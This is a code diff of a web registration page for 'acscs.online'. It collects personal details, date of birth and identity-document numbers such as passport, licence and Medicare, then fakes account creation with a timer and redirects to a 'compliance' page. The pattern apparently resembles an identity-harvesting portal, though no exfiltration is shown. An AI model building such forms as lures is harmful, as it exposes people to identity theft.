-        <input type="checkbox" id="terms"/>
-        <label for="terms">
-          I agree to the <a href="#" target="_blank">Terms of Use</a>
-          and <a href="#" target="_blank">Privacy Policy</a>
-        </label>
-      </div>
-
-      <!-- Submit -->
-      <button type="submit" class="reg-btn" id="regBtn">
-        Create Account
-      </button>
-
-      <div class="login-row">
-        Already have an account? <a href="login.html">Log in here</a>
-      </div>
-
+      <div class="terms-row"><input type="checkbox" id="terms"/><label for="terms">I agree to the <a href="#" target="_blank">Terms of Use</a> and <a href="#" target="_blank">Privacy Policy</a></label></div>
+      <button type="submit" class="submit-btn" id="regBtn">Create Account</button>
     </form>
+    <div class="card-footer">Already have an account? <a href="login.html">Log in here</a></div>
   </div>
-
-  <!-- ── FOOTER ── -->
-  <footer class="page-footer">
-    &copy; 2026 <a href="https://acscs.online">acscs.online</a>. All rights reserved.
-  </footer>
-
 </div>
-
 <script>
 'use strict';
-
-/* ── Password show/hide ── */
-function togglePwd(inputId, iconId) {
-  const inp = document.getElementById(inputId);
-  inp.type = inp.type === 'password' ? 'text' : 'password';
-  document.getElementById(iconId).textContent = inp.type === 'password' ? '👁' : '🙈';
-}
-
-/* ── Password strength ── */
-function checkStrength(val) {
-  const segs   = ['s1','s2','s3','s4'];
-  const label  = document.getElementById('strengthLabel');
-  const levels = [
-    { cls:'',       label:'' },
-    { cls:'weak',   label:'Weak' },
-    { cls:'fair',   label:'Fair' },
-    { cls:'good',   label:'Good' },
-    { cls:'strong', label:'Strong' },
-  ];
-  let score = 0;
-  if (val.length >= 8)              score++;
-  if (/[A-Z]/.test(val))            score++;
-  if (/[0-9]/.test(val))            score++;
-  if (/[^A-Za-z0-9]/.test(val))    score++;
-
-  segs.forEach((id, i) => {
-    const el = document.getElementById(id);
-    el.className = 'strength-seg';
-    if (i < score) el.classList.add(levels[score].cls);
-  });
-  label.textContent = val.length ? levels[score].label : '';
-  label.style.color = ['','#c0392b','#e67e22','#b07a00','#1a7a40'][score] || '#778';
-}
-
-/* ── Clear error ── */
-function clearErr(el) { el.classList.remove('err'); }
-
-/* ── Validation rules ── */
-const rules = [
-  { id:'fname',    test: v => v.length >= 2 },
-  { id:'lname',    test: v => v.length >= 2 },
-  { id:'email',    test: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) },
-  { id:'phone',    test: v => v.replace(/\D/g,'').length >= 8 },
-  { id:'street',   test: v => v.length >= 3 },
-  { id:'suburb',   test: v => v.length >= 2 },
-  { id:'state',    test: v => v !== '' },
-  { id:'postcode', test: v => /^\d{4}$/.test(v) },
-  { id:'username', test: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) },
-  { id:'password', test: v => v.length >= 8 },
-  { id:'confirm',  test: v => v === document.getElementById('password').value && v.length >= 8 },
-];
-
-/* ── Submit handler ── */
-function doRegister(e) {
-  e.preventDefault();
-
-  // Terms check
-  if (!document.getElementById('terms').checked) {
-    alert('Please agree to the Terms of Use and Privacy Policy.');
-    return;
-  }
-
-  // DOB check
-  if (!validateDOB()) return;
-
-  let allGood = true;
-  let firstBad = null;
-
-  rules.forEach(({ id, test }) => {
-    const el  = document.getElementById(id);
-    const val = el.value.trim();
-    const ok  = test(val);
-    el.classList.toggle('err', !ok);
-    el.classList.toggle('ok',   ok);
-    if (!ok && !firstBad) firstBad = el;
-    if (!ok) allGood = false;
-  });
-
-  if (!allGood) {
-    firstBad.scrollIntoView({ behavior:'smooth', block:'center' });
-    firstBad.focus();
-    return;
-  }
-
-  // Loading state
-  const btn = document.getElementById('regBtn');
-  btn.disabled = true;
-  btn.innerHTML = '<span class="spinner"></span> Creating account…';
-
-  setTimeout(() => {
-    // ── Save registration details for compliance page ──
-    const userData = {
-      fname    : document.getElementById('fname').value.trim(),
-      lname    : document.getElementById('lname').value.trim(),
-      email    : document.getElementById('email').value.trim(),
-      phone    : document.getElementById('phone').value.trim(),
-      state    : document.getElementById('state').value,
-      suburb   : document.getElementById('suburb').value.trim(),
-      postcode : document.getElementById('postcode').value.trim(),
-      street   : document.getElementById('street').value.trim(),
-    };
-    localStorage.setItem('portalUser', JSON.stringify(userData));
-
-    btn.style.background = '#1a7a40';
-    btn.innerHTML = '✓ Account Created!';
-    document.getElementById('successBox').classList.add('show');
-    document.getElementById('successBox').scrollIntoView({ behavior:'smooth', block:'center' });
-
-    setTimeout(() => {
-      window.location.href = 'compliance.html';
-    }, 2000);
-  }, 1800);
-}
-
-/* ── Real-time validation on blur ── */
-document.querySelectorAll('#regForm input, #regForm select').forEach(el => {
-  el.addEventListener('blur', function() {
-    if (this.value.trim()) {
-      this.classList.remove('err');
-      this.classList.add('ok');
-    }
-  });
-});
-
-/* ── ID type selection ── */
-const idConfig = {
-  passport: { label:'Passport Number',          placeholder:'e.g. PA1234567',   extras:'passportExtras' },
-  licence:  { label:'Licence Number',           placeholder:'e.g. 12345678',    extras:'licenceExtras'  },
-  medicare: { label:'Medicare Card Number',     placeholder:'e.g. 2123 45678 1',extras:'medicareExtras' },
-  birth:    { label:'Certificate Registration No.', placeholder:'e.g. 1234567890', extras:null },
-  visa:     { label:'Visa / ImmiCard Number',   placeholder:'e.g. 123456789',   extras:null },
-  other:    { label:'ID Number',                placeholder:'Enter your ID number', extras:null },
-};
-
-function selectID(card, type) {
-  /* Deselect all */
-  document.querySelectorAll('.id-card').forEach(c => c.classList.remove('selected'));
-  /* Select clicked */
-  card.classList.add('selected');
-  document.getElementById('idType').value = type;
-  document.getElementById('idTypeErr').style.display = 'none';
-
-  /* Update label & placeholder */
-  const cfg = idConfig[type];
-  document.getElementById('idNumberLabel').textContent = cfg.label + ' *';
-  document.getElementById('idNumber').placeholder = cfg.placeholder;
-  document.getElementById('idNumber').value = '';
-
-  /* Hide all extras, show relevant */
-  ['passportExtras','licenceExtras','medicareExtras'].forEach(id => {
-    document.getElementById(id).style.display = 'none';
-  });
-  if (cfg.extras) document.getElementById(cfg.extras).style.display = 'block';
-
-  /* Show fields block */
-  document.getElementById('idFields').style.display = 'block';
-  document.getElementById('idNumber').focus();
-}
-
-/* ── MM/YYYY date formatter ── */
-function fmtMMYYYY(el) {
-  let v = el.value.replace(/\D/g,'').slice(0,6);
-  if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
-  el.value = v;
-}
-
-/* ── Populate Day dropdown (1–31) ── */
-(function populateDays() {
-  const sel = document.getElementById('dobDay');
-  for (let d = 1; d <= 31; d++) {
-    const o = document.createElement('option');
-    o.value = String(d).padStart(2,'0');
-    o.textContent = String(d).padStart(2,'0');
-    sel.appendChild(o);
-  }
-})();
-
-/* ── Populate Year dropdown (current year − 100 → current year − 18) ── */
-(function populateYears() {
-  const sel  = document.getElementById('dobYear');
-  const now  = new Date().getFullYear();
-  for (let y = now - 18; y >= now - 100; y--) {
-    const o = document.createElement('option');
-    o.value = y; o.textContent = y;
-    sel.appendChild(o);
-  }
-})();
-
-/* ── Clear DOB error ── */
-function clearDobErr() {
-  document.getElementById('dobErr').style.display = 'none';
-  ['dobDay','dobMonth','dobYear'].forEach(id => {
-    document.getElementById(id).style.borderColor = '';
-  });
-}
-
-/* ── Validate DOB ── */
-function validateDOB() {
-  const d = document.getElementById('dobDay').value;
-  const m = document.getElementById('dobMonth').value;
-  const y = document.getElementById('dobYear').value;
-  if (!d || !m || !y) {
-    document.getElementById('dobErr').style.display = 'block';
-    ['dobDay','dobMonth','dobYear'].forEach(id => {
-      if (!document.getElementById(id).value)
-        document.getElementById(id).style.borderColor = '#c23934';
-    });
-    return false;
-  }
-  return true;
-}
+function clearErr(el){el.classList.remove('err');}
+function togglePwd(inputId,iconId){var inp=document.getElementById(inputId);inp.type=inp.type==='password'?'text':'password';document.getElementById(iconId).textContent=inp.type==='password'?'\uD83D\uDC41':'\uD83D\uDE48';}
+function checkStrength(val){var segs=['s1','s2','s3','s4'];var labels=['','Weak','Fair','Good','Strong'];var classes=['','weak','fair','good','strong'];var score=0;if(val.length>=8)score++;if(/[A-Z]/.test(val))score++;if(/[0-9]/.test(val))score++;if(/[^A-Za-z0-9]/.test(val))score++;segs.forEach(function(id,i){var el=document.getElementById(id);el.className='strength-seg';if(i<score)el.classList.add(classes[score]);});document.getElementById('strengthLabel').textContent=val?labels[score]:'';}
+var rules=[{id:'fname',test:function(v){return v.length>0;}},{id:'lname',test:function(v){return v.length>0;}},{id:'email',test:function(v){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);}},{id:'phone',test:function(v){return v.length>0;}},{id:'street',test:function(v){return v.length>0;}},{id:'suburb',test:function(v){return v.length>0;}},{id:'state',test:function(v){return v!=='';}},{id:'postcode',test:function(v){return /^\d{4}$/.test(v);}},{id:'username',test:function(v){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);}},{id:'password',test:function(v){return v.length>=8;}},{id:'confirm',test:function(v){return v===document.getElementById('password').value&&v.length>=8;}}];
+function doRegister(e){e.preventDefault();if(!document.getElementById('terms').checked){alert('Please agree to the Terms of Use and Privacy Policy.');return;}if(!validateDOB())return;var allGood=true;var firstBad=null;rules.forEach(function(r){var el=document.getElementById(r.id);var val=el.value.trim();var ok=r.test(val);el.classList.toggle('err',!ok);el.classList.toggle('ok',ok);if(!ok&&!firstBad)firstBad=el;if(!ok)allGood=false;});if(!allGood){firstBad.scrollIntoView({behavior:'smooth',block:'center'});firstBad.focus();return;}var btn=document.getElementById('regBtn');btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Creating account...';setTimeout(function(){var userData={fname:document.getElementById('fname').value.trim(),lname:document.getElementById('lname').value.trim(),email:document.getElementById('email').value.trim(),phone:document.getElementById('phone').value.trim(),state:document.getElementById('state').value,suburb:document.getElementById('suburb').value.trim(),postcode:document.getElementById('postcode').value.trim(),street:document.getElementById('street').value.trim()};localStorage.setItem('portalUser',JSON.stringify(userData));btn.style.background='#1a7a40';btn.innerHTML='Account Created!';document.getElementById('successBox').classList.add('show');document.getElementById('successBox').scrollIntoView({behavior:'smooth',block:'center'});setTimeout(function(){window.location.href='compliance.html';},2000);},1800);}
+var idConfig={passport:{label:'Passport Number',placeholder:'e.g. PA1234567',extras:'passportExtras'},licence:{label:'Licence Number',placeholder:'e.g. 12345678',extras:'licenceExtras'},medicare:{label:'Medicare Card Number',placeholder:'e.g. 2123 45678 1',extras:'medicareExtras'}};
+function selectID(card,type){document.querySelectorAll('.id-card').forEach(function(c){c.classList.remove('selected');});card.classList.add('selected');document.getElementById('idType').value=type;document.getElementById('idTypeErr').style.display='none';var cfg=idConfig[type];document.getElementById('idNumberLabel').textContent=cfg.label+' *';document.getElementById('idNumber').placeholder=cfg.placeholder;document.getElementById('idNumber').value='';['passportExtras','licenceExtras','medicareExtras'].forEach(function(id){document.getElementById(id).style.display='none';});if(cfg.extras)document.getElementById(cfg.extras).style.display='block';document.getElementById('idFields').style.display='block';document.getElementById('idNumber').focus();}
+function fmtMMYYYY(el){var v=el.value.replace(/\D/g,'').slice(0,6);if(v.length>=3)v=v.slice(0,2)+'/'+v.slice(2);el.value=v;}
+(function(){var sel=document.getElementById('dobDay');for(var d=1;d<=31;d++){var o=document.createElement('option');o.value=String(d).padStart(2,'0');o.textContent=String(d).padStart(2,'0');sel.appendChild(o);}})();
+(function(){var sel=document.getElementById('dobYear');var now=new Date().getFullYear();for(var y=now-18;y>=now-100;y--){var o=document.createElement('option');o.value=y;o.textContent=y;sel.appendChild(o);}})();
+function clearDobErr(){document.getElementById('dobErr').style.display='none';}
+function validateDOB(){var d=document.getElementById('dobDay').value;var m=document.getElementById('dobMonth').value;var y=document.getElementById('dobYear').value;if(!d||!m||!y){document.getElementById('dobErr').style.display='block';return false;}return true;}
 </script>
-
 </body>
 </html>
